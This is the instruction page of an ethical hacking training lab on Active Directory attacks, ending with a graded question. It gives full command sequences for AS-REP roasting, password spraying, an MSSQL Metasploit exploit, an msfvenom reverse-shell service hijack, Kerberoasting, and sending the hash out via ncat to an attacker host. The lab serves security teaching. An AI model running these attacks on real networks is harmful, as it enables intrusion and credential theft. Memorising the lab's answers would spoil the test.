System Hacking  
  
[Exit Lab](https://labclient.labondemand.com/Instructions/90bc7612-e275-4130-ac6c-029b3f14adbd# "Menu with options for exiting the lab, including saving and ending the lab.")  
  
Instructions Resources  
  
# Lab 5: Perform Active Directory (AD) Attacks Using Various Tools  
  
**Lab Scenario**  
  
Active Directory (AD) range attacks in ethical hacking involve exploiting vulnerabilities within AD's infrastructure. These attacks can include password spraying, Kerberoasting, and exploiting misconfigurations. Ethical hackers use these techniques to assess an organization's security, identify weaknesses, and recommend improvements to protect against real-world threats and unauthorized access.  
  
As a professional ethical hacker you need to know how to perform various AD attacks such as password spraying, Kerberoasting etc., to gain privileged access in AD network.  
  
**Lab Objectives**  
  
- Perform Initial Scans to Obtain Domain Controller IP and Domain Name  
- Perform AS-REP Roasting attack  
- Spray cracked password into network using CrackMapExec  
- Perform post-enumeration using PowerView  
- Perform Attack on MSSQL service  
- Perform privilege escalation  
- Perform Kerberoasting Attack  
  
**Overview of AD Attacks**  
  
AD attacks involve exploiting vulnerabilities in the AD to gain unauthorized access, escalate privileges, and steal sensitive data. Techniques include password cracking, Kerberos attacks, and exploiting misconfigurations. As ethical hackers, you can use these methods to test defenses, identify weaknesses, and enhance security for organizations' network infrastructures.  
  
## Task 1: Perform Initial Scans to Obtain Domain Controller IP and Domain Name  
  
The initial scan in AD enumeration is crucial as it identifies the network structure, open ports, and services. This information helps ethical hackers map the AD environment, uncover vulnerabilities, and plan targeted attacks to assess security measures and identify potential weaknesses.  
  
Here, we are using Nmap tool to perform initial scans on the domain controller (DC).  
  
1.  Click on [Parrot Security](https://labclient.labondemand.com/Instructions/90bc7612-e275-4130-ac6c-029b3f14adbd#) to switch to the **Parrot Security** machine. Open a **Terminal** window and execute **sudo su** to run the programs as a root user (When prompted, enter the password **toor**).  
  
2.  Now, run the **cd** command to jump to the root directory.  
  
3.  Execute the **nmap 10.10.1.0/24** command to scan the entire subnet and identify the DC IP address.  
  
    ![AD1.1.3.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.1.3.jpg)  
  
4.  Observe the nmap output carefully. Here, nmap shows that host **10.10.1.22** has **port** **88/TCP** **kerberos-sec** and **port 389/TCP LDAP** opened which confirms that our DC IP address is **10.10.1.22**.  
  
    ![AD1.1.4.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.1.4.jpg)  
  
5.  Now, we will scan **10.10.1.22** in more detail to obtain more information. Execute the **nmap -A -sC -sV 10.10.1.22** command.  
  
    ![AD1.1.5a.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.1.5a.jpg)  
  
    ![AD1.1.5b.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.1.5b.jpg)  
  
6.  After scanning is complete, we get the domain name which is **CEH.com**.  
  
7.  Now, we have DC IP and domain name, which can be used in the AS-REP Roasting attack.  
  
8.  Close all open windows and document all the acquired information.  
  
  
---  
  
## Task 2: Perform AS-REP Roasting Attack  
  
An AS-REP roasting attack targets user accounts in AD that do not require Kerberos pre-authentication, exploiting the DONT_REQ_PREAUTH setting. Attackers can request a ticket-granting ticket (TGT) for these accounts without needing the user's password.  
  
The DC responds with an encrypted TGT, which the attacker captures. This TGT, encrypted with the user's password hash, is then subjected to offline password-cracking tools such as Hashcat or John the Ripper. By rapidly guessing the password, the attacker can eventually decrypt the TGT, revealing the user's password.  
  
1.  In Parrot Security machine, open a new **Terminal** window and execute **sudo su** to run the programs as a root user (When prompted, enter the password **toor**).  
  
2.  Now, run the **cd** command to jump to the root directory.  
  
    ![AD1.2.2.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.2.2.jpg)  
  
3.  Type **cd impacket/examples/** and press **Enter** to move into the examples directory.  
  
    ![AD1.2.3.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.2.3.jpg)  
  
4.  Execute the command **python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22**.  
  
    - **GetNPUsers.py**: Python script to retrieve AD user information.  
  
    - **CEH.com/**: Target AD domain.  
  
    - **-no-pass**: Flag to find user accounts not requiring pre-authentication.  
  
    - **-usersfile** ~/ADtools/users.txt: Path to the file with the user account list.  
  
    - **-dc-ip 10.10.1.22**: IP address of the DC to query.  
  
  
    ![AD1.2.4.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.2.4.jpg)  
  
5.  We can observe that the user **Joshua** has **DONT_REQUIRE_PREAUTH** set. As this user is vulnerable to AS-REP roasting, we obtain Joshua's password hash.  
  
6.  Copy that hash and save it as **joshuahash.txt**. Execute the command **echo '[HASH]' > joshuahash.txt**.  
  
    ![AD1.2.6a.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.2.6a.jpg)  
  
    ![AD1.2.6b.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.2.6b.jpg)  
  
7.  Execute the command **john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt**. This will crack the password hash and will give us the password in plain text.  
  
    ![AD1.2.7.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.2.7.jpg)  
  
8.  The password for the user Joshua has been cracked, as shown in the above screenshot which is **cupcake**.  
  
9.  Close all open windows and document all the acquired information.  
  
  
---  
  
## Task 3: Spray Cracked Password into Network using CrackMapExec.  
  
Using CrackMapExec for password spraying involves leveraging its capabilities to automate the process. For instance, if "cupcake" is a cracked password, CME can be used to test this password against numerous user accounts and services across a network. This approach helps identify other accounts that may be using the same password, facilitating further penetration testing or security assessments.  
  
1.  In **Parrot Security** machine, open a new **Terminal** window and execute **sudo su** to run the programs as a root user (When prompted, enter the password **toor**).  
  
2.  Now, run the **cd** command to jump to the root directory.  
  
    ![AD1.3.2.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.3.2.jpg)  
  
3.  In **Lab 5: Task 1**, from the Nmap results we can observe that other hosts in the subnet are running services such as RDP, SSH, and FTP. Therefore, we can perform password spraying on each service individually to check for correct credentials. In this task, we will be focusing on RDP. However, you can explore and check other services.  
  
4.  Execute command **cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"** to perform password spraying.  
  
    - **rdp**: Targets the Remote Desktop Protocol (RDP) service.  
  
    - **10.10.1.0/24**: IP address range to target, encompassing all hosts within the subnet 10.10.1.0 with a subnet mask of 255.255.255.0.  
  
    - **-u /root/ADtools/users.txt**: Specifies the path to the file containing user accounts for authentication.  
  
    - **-p "cupcake"**: Password which we cracked using AS-REP Roasting to test against the RDP service on the specified hosts.  
  
  
    ![AD1.3.4.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.3.4.jpg)  
  
5.  After the spray completion we find that user **Mark** is using the same password **cupcake** on host **10.10.1.40**. We will now try to connect to RDP as user **mark**.  
  
    ![AD1.3.5.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.3.5.jpg)  
  
6.  Click on **Menu** and search for **remmina** in the search filed; then, select **Remmina** from the results.  
  
    ![AD1.3.6.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.3.6.jpg)  
  
7.  In the **Remmina Remote Desktop Client** window, enter IP address **10.10.1.40** to connect (10.10.1.40 is the IP address of **Windows 11 (AD)** virtual machine ). A prompt appears asking **Accept certificate?** Tap **yes**.  
  
    ![AD1.3.7a.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.3.7a.jpg)  
  
    ![AD1.3.7b.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.3.7b.jpg)  
  
8.  In the **Enter RDP authentication credentials** window, enter **Mark** in the Username field and **cupcake** in the Password field; then, click **OK**.  
  
    ![AD1.3.8a.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.3.8a.jpg)  
  
9.  A **Remote Desktop** connection will be successfully established to the target system.  
  
    ![AD1.3.8b1.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/AD1.3.8b1.jpg)  
  
10.  Minimize the Remmina window.  
  
  
---  
  
## Task 4: Perform Post-Enumeration using PowerView  
  
PowerView is a PowerShell tool designed for network and AD enumeration. It helps security professionals gather detailed information about user accounts, groups, computers, and domain trusts. PowerView is used to identify potential security weaknesses and misconfigurations in an AD environment. It is commonly employed in penetration testing and red team operations.  
  
1.  In the terminal, execute the command **cd /root/ADtools** to move into the ADtools folder.  
  
    ![1.4.2.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/1.4.2.jpg)  
  
2.  Next, we will attempt post-enumeration to gather additional information about the AD.  
  
3.  For enumeration purposes, we will utilize the **PowerView.ps1** script. We will host a Python server on our attacker machine to share this script, and then we will download it onto a Windows 11 machine (Mark) using an RDP session.  
  
4.  Type **python3 -m http.server** in the terminal and press **Enter** to start the HTTP server.  
  
    ![1.4.5.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/1.4.5.jpg)  
  
5.  After starting the HTTP server, return to Remmina where our RDP session is active. Then, open the **Firefox** browser and navigate to the URL **http://10.10.1.13:8000/PowerView.ps1** to automatically download the **PowerView.ps1** script. Close the **Firefox** browser window.  
  
    ![1.4.61.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/1.4.61.jpg)  
  
6.  Once the script is downloaded, launch **PowerShell** by searching for it in Windows search option.  
  
    ![1.4.71.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/1.4.71.jpg)  
  
7.  Navigate to the **Downloads** folder by running the command **cd Downloads**. Before loading the script, run the command **powershell -EP Bypass** to enable script execution.  
  
8.  Now, execute the command **. .\PowerView.ps1** to load the PowerView.ps1 script in PowerShell.  
  
    ![1.4.91.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/1.4.91.jpg)  
  
9.  Next, execute **Get-NetComputer** command in PowerShell. This command will display all the information related to computers in AD. It lists all computer objects in AD, which can help in identifying network targets and mapping the AD environment.  
  
    ![1.4.101.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/1.4.101.jpg)  
  
10.  Now, execute **Get-NetGroup** in PowerShell. The Get-NetGroup command in PowerView lists all groups in AD, which helps in identifying group memberships and potential targets for privilege escalation.  
  
    ![1.4.111.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/1.4.111.jpg)  
  
11.  Execute command **Get-NetUser** in PowerShell. Get-NetUser in PowerView retrieves detailed information about AD user accounts, such as usernames and group memberships. It helps identify potential targets and understand the AD environment better.  
  
    ![1.4.121.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/1.4.121.jpg)  
  
12.  During user enumeration, we found a new user **SQL_srv**, who has some high privileges and could be useful for further attacks. In the next task we will be attacking the **SQL_srv** user who has SQL service running on it.  
  
    ![1.4.131.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/1.4.131.jpg)  
  
13.  Here are some other listed commands that you can use with **PowerView.ps1** for enumeration:  
  
    - **Get-NetOU** - Lists all organizational units (OUs) in the domain.  
    - **Get-NetSession** - Lists active sessions on the domain.  
    - **Get-NetLoggedon** - Lists users currently logged on to machines.  
    - **Get-NetProcess** - Lists processes running on domain machines.  
    - **Get-NetService** - Lists services on domain machines.  
    - **Get-NetDomainTrust** - Lists domain trust relationships.  
    - **Get-ObjectACL** - Retrieves ACLs for a specified object.  
    - **Find-InterestingDomainAcl** - Finds interesting ACLs in the domain.  
    - **Get-NetSPN** - Lists service principal names (SPNs) in the domain.  
    - **Invoke-ShareFinder** - Finds shared folders in the domain.  
    - **Invoke-UserHunter** - Finds where domain admins are logged in.  
    - **Invoke-CheckLocalAdminAccess** - Checks if the current user has local admin access on specified machines.  
14.  Before proceeding to the next task, restart **Parrot Security** machine.  
  
  
---  
  
## Task 5: Perform Attack on MSSQL service  
  
**xp_cmdshell** is a SQL server stored procedure enabling command shell execution. Misconfigured xp_cmdshell can lead to arbitrary command execution, data exfiltration, and potential network compromise, posing significant security risks. Proper configuration and security measures are crucial to mitigate these risks.  
  
1.  During the Nmap scan, we observed that host **10.10.1.30** (which is **Windows Server 2019 (AD)** virtual machine) has port **1433** open. We will attempt to brute force the password using **Hydra**, as we already know the username, which is **SQL_srv**.  
  
2.  In the **Parrot Security** machine login with **attacker/toor** credentials.Open a new **Terminal** window and execute **sudo su** to run the programs as a root user (When prompted, enter the password **toor**).  
  
3.  Save the username **SQL_srv** in a text file and name it as **user.txt** using command **pluma user.txt**.  
  
    ![n3.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/n3.jpg)  
  
4.  Execute command **hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql** to brute force the MSSQL service password.  
  
    ![4new.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/4new.jpg)  
  
5.  We have successfully cracked the password for **SQL_srv**, which is "**batman**". Next, we will attempt to log into the service using **mssqlclient.py**.  
  
6.  Execute command **python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433**.  
  
    > Note the database name, which is "**master**" here.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/qbibofqt.jpg)  
  
7.  Execute the SQL query **SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';**, returning a value of 1, indicating that xp_cmdshell is enabled on the server.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/czpiaw43.jpg)  
  
8.  Now, as we know that **xp_cmdshell** is enabled on SQL server we can use Metasploit to exploit this service. Type **exit** and press **Enter**; then execute the command **msfconsole** to launch Metasploit.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/1puq2r3r.jpg)  
  
9.  Execute the following commands:  
  
    - **use exploit/windows/mssql/mssql_payload**  
    - **set RHOST 10.10.1.30**  
    - **set USERNAME SQL_srv**  
    - **set PASSWORD batman**  
    - **set DATABASE master**  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/owwkm0mn.jpg)  
  
10.  Once all commands are configured, type **exploit** and press **Enter**.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/debssnr2.jpg)  
  
11.  Once the exploitation is complete, we will be getting a Meterpreter session as show in the screenshot.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/t1p44eiq.jpg)  
  
12.  Type command **shell** and press **Enter**. Execute **whoami** command, to determine the username of the currently logged on user. Here, it is $sqlexpress which is the SQL service.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/nuta2tkt.jpg)  
  
  
---  
  
## Task 6: Perform Privilege Escalation  
  
WinPEASx64.exe is a tool for Windows privilege escalation, identifying misconfigurations and vulnerabilities for potential exploitation.  
  
The Unquoted Service Path vulnerability in the RunOnce registry key arises when a Windows service path lacks proper quotation marks and contains spaces, enabling attackers to execute arbitrary code with elevated privileges during system startup.  
  
1.  To perform further attacks, we need high privileges. For privilege escalation, we will use WinPEAS.exe to enumerate any misconfigurations.  
  
2.  We will upload the WinPEAS.exe file and execute it in Windows.  
  
3.  Move to C:\ using the command **cd C:\**.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/ltdefeyu.jpg)  
  
4.  Next, move to **C:\Users\Public\Downloads** using **cd** and execute the command **powershell**.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/v1zpsjcy.jpg)  
  
5.  Now, we need to host winPEASx64.exe on the attacker machine using Python. Open a new terminal, type **sudo su**, press **Enter**, and use **toor** as password. Execute the command **cd /root/ADtools**.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/duxg42jn.jpg)  
  
6.  Type **python3 -m http.server** and press **Enter** to host the **winPEASx64.exe** file.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/3xzvbvmy.jpg)  
  
7.  Get back to the shell terminal and type **wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe**.  
  
    > Do not end the Python sever  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/lkxsbfdk.jpg)  
  
8.  Once winpeas.exe is downloaded, execute it with **./winpeas.exe**.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/ep10finj.jpg)  
  
9.  Script execution starts; wait until the execution completes.  
  
10.  Once the execution is completed, observe the output. Here, we have a file named **file.exe** in **C:\Program Files\CEH Services** that is unquoted and can be exploited for privilege escalation.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/bvoznckm.jpg)  
  
11.  Open a new terminal with root privileges using the command sudo su and **toor** as password. Execute the **msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe** command.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/gkmaz2ge.jpg)  
  
12.  Get back to our shell terminal and move to C:\Program Files\CEH Services. Execute the command **cd ../../.. ; cd "Program Files/CEH Services"**.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/j4sxggsg.jpg)  
  
13.  Execute the command **move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe**.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/1ffr21cd.jpg)  
  
14.  Now, go to another terminal and type **nc -nvlp 8888** and press **Enter**.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/b3k2qqrj.jpg)  
  
15.  Click on [Windows Server 2019 (AD)](https://labclient.labondemand.com/Instructions/90bc7612-e275-4130-ac6c-029b3f14adbd#) to switch to the Windows Server 2019 (AD) machine, assuming we are the victim now. Restart the machine by hovering over **Power and Display** button and click **Reset/Reboot** button present at the toolbar located above the virtual machine and log in with the username **SQL_srv** and password "**batman**."  
  
    > In the **Reset/Reboot Machine** window click **Yes**.  
  
16.  After logging in, switch back to the [Parrot Security](https://labclient.labondemand.com/Instructions/90bc7612-e275-4130-ac6c-029b3f14adbd#). Here, we got the shell to our netcat listener. Which is a privileged shell.  
  
17.  Execute command **whoami** determine username of the currently logged on user.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/tgn10x35.jpg)  
  
  
---  
  
## Task 7: Perform Kerberoasting Attack  
  
Rubeus is a tool for exploiting Kerberos weaknesses in Windows environments. Kerberoasting is a method to extract ticket granting ticket (TGT) hashes from AD. Attackers target service accounts with associated Kerberos service principal names (SPNs). TGTs are requested from the DC for these accounts, then cracked offline to reveal user passwords. Kerberoasting exploits weak service account passwords and the nature of Kerberos authentication.  
  
1.  In the netcat shell, execute the **powershell** command to launch PowerShell.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/f4cx40v2.jpg)  
  
2.  Navigate to C:\Users\Public\Downloads and execute the command **cd ../.. ; cd Users\Public\Downloads**.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/cdlzghgj.jpg)  
  
3.  Now, we will be downloading Rubeus and netcat. Execute the command **wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe ; wget http://10.10.1.13:8000/ncat.exe -o ncat.exe**. Once the tools are downloaded type **exit** and press **Enter**.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/f1hvszzt.jpg)  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/zpvwjp40.jpg)  
  
4.  Type **cd ../.. && cd Users\Public\Downloads** and press **Enter** to move into the Downloads folder.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/nnmf5l4m.jpg)  
  
5.  Execute the command **rubeus.exe kerberoast /outfile:hash.txt**.  
  
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab168799/screens/v2nb4f5z.jpg)  
  
6.  After kerberoasting the password hash for **DC-Admin** is saved in **hash.txt** file.  
  
    ![a.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/a.jpg)  
  
7.  To get that hash file on the attacker machine, we will be using netcat. Open a new terminal, type **sudo su** and press **Enter**; use **toor** as password. Then execute the command **nc -lvp 9999 > hash.txt** .  
  
    ![b.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/b.jpg)  
  
8.  In the shell terminal, execute the command **ncat.exe -w 3 10.10.1.13 9999 < hash.txt**.  
  
    ![c.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/c.jpg)  
  
9.  Get back to the netcat listener terminal and press **Enter** to save the file.  
  
    ![d.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/d.jpg)  
  
10.  Now, we will be using HashCat to crack the password hash. Execute the command **hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt**.  
  
    - -m 13100: This specifies the hash type. 13100 corresponds to Kerberos 5 AS-REQ Pre-Auth etype 23 (RC4-HMAC), a specific format for Kerberos hashes.  
    - --force: This option forces Hashcat to ignore warnings and run even if there are compatibility issues. Use this with caution, as it might cause instability or incorrect results.  
    - -a 0: This specifies the attack mode. 0 stands for a straight attack, which is a simple dictionary attack where Hashcat tries each password in the dictionary as it is.  
    - hash.txt: is the input file containing the hashes to crack  
    - /root/ADtools/rockyou.txt: is the wordlist file used for the attack  
  
    ![e.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/e.jpg)  
  
11.  After completation, we get the password **advanced!**. As DC-Admin has high privileges on the domain, we can use this password for further attacks.  
  
    ![f.jpg](https://labondemand.blob.core.windows.net/content/lab168799/instructions255476/f.jpg)  
  
12.  This concludes the demonstration of performing AD attack.  
  
13.  Close all open windows and document all the acquired information.  
  
  
**Question 6.5.7.1**  
  
Use Parrot Security machine to identify the Domain Controller in the target network 10.10.1.0/24 and perform AS-REP roasting on Windows Server 2022 (10.10.1.22) to obtain of user Joshua. Perform password spraying on the subnet to identify the user with same password on the subnet. Connect to the user account that was compromised during password spraying and use PowerView to perform enumeration and exploit SQL_srv user enumerated with PowerView to obtain privileged access to the domain and perform kerberoasting on target Domain Controller (Windows Server 2022) to obtain password of DC-Admin. Enter the password of the DC-Admin user that was obtained after kerberoasting.  
  
  
  
3 Hr 47 Min Remaining  